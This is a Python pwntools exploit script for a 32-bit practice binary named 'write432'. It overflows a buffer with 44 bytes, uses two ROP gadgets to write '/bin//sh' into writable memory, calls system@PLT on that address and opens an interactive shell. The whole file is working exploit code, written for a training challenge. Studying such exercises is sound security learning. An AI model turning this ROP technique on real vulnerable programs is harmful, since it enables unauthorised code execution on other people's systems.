#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def write_mem(address, string):
    chain =  p32(0x080486da)  # pop edi; pop ebp; ret
    chain += p32(address)
    chain += string
    chain += p32(0x08048670)  # mov [edi], ebp; ret
    return chain

def exploit():
    p = process('./write432')
    binary = ELF("write432", checksec=False)
    systemPLT = binary.symbols["system"]
    address = 0x0804a0c8  # address to start write to

    # create payload
    payload = 44*"A"
    payload += write_mem(address,  '/bin') # write '/bin' into memory
    payload += write_mem(address+4,'//sh') # write '//sh' into memory + 4
    payload += p32(systemPLT)              # system@PLT
    payload += p32(0xcafebabe)
    payload += p32(address)

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF
